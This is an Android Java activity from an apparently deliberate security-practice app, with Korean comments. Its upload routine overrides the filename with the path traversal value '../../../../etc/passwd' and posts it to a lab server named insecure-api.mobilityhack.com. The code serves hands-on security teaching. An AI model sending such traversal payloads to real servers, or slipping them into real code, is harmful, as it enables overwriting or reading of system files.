package com.mobility.hack.community;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import com.mobility.hack.R;
import com.mobility.hack.network.ApiService;
import com.mobility.hack.network.InquiryResponse;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class InquiryWriteActivity extends AppCompatActivity {
    private static final String TAG = "SecurityExploit";
    private Uri selectedFileUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_inquiry_write);

        // [1] UI 연결: + 모양 이미지 버튼 클릭 시 갤러리 열기
        findViewById(R.id.iv_add_image).setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("*/*");
            galleryLauncher.launch(intent);
        });

        // 뒤로가기
        findViewById(R.id.btn_back).setOnClickListener(v -> finish());

        // [3] 전송 버튼 클릭 시 취약한 업로드 실행
        findViewById(R.id.btn_submit).setOnClickListener(v -> {
            if (selectedFileUri != null) {
                uploadInquiryWithVulnerability();
            } else {
                Toast.makeText(this, "파일을 선택해주세요.", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private final ActivityResultLauncher<Intent> galleryLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
                    selectedFileUri = result.getData().getData();
                    Toast.makeText(this, "파일이 선택되었습니다.", Toast.LENGTH_SHORT).show();
                }
            }
    );

    /**
     * [보안 실습용 취약한 업로드 로직]
     * Retrofit2를 사용하며, 파일명을 강제로 조작하여 전송함
     */
    private void uploadInquiryWithVulnerability() {
        try {
            // 임시 파일 생성
            File file = new File(getCacheDir(), "temp_upload");
            InputStream inputStream = getContentResolver().openInputStream(selectedFileUri);
            FileOutputStream outputStream = new FileOutputStream(file);
            byte[] buf = new byte[1024];
            int len;
            while ((len = inputStream.read(buf)) > 0) outputStream.write(buf, 0, len);
            outputStream.close();
            inputStream.close();

            // [보안 실습 핵심] 파일명 강제 조작 (Path Traversal)
            String maliciousFileName = "../../../../etc/passwd";
            Log.d(TAG, "[SecurityExploit] 전송 시도 경로: " + maliciousFileName);

            // 멀티파트 바디 구성
            RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
            // 조작된 파일명을 세 번째 인자로 전달
            MultipartBody.Part body = MultipartBody.Part.createFormData("file", maliciousFileName, requestFile);

            RequestBody title = RequestBody.create(MediaType.parse("text/plain"), "테스트 제목");
            RequestBody content = RequestBody.create(MediaType.parse("text/plain"), "테스트 내용");

            // Retrofit 초기화
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://insecure-api.mobilityhack.com/")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();

            ApiService apiService = retrofit.create(ApiService.class);
            apiService.uploadInquiry(title, content, body).enqueue(new Callback<InquiryResponse>() {
                @Override
                public void onResponse(Call<InquiryResponse> call, Response<InquiryResponse> response) {
                    if (response.isSuccessful() && response.body() != null) {
                        Log.d(TAG, "[SecurityExploit] 서버 응답 stored_name: " + response.body().getStoredName());
                        Toast.makeText(InquiryWriteActivity.this, "전송 완료!", Toast.LENGTH_SHORT).show();
                        finish();
                    }
                }

                @Override
                public void onFailure(Call<InquiryResponse> call, Throwable t) {
                    Log.e(TAG, "전송 실패: " + t.getMessage());
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}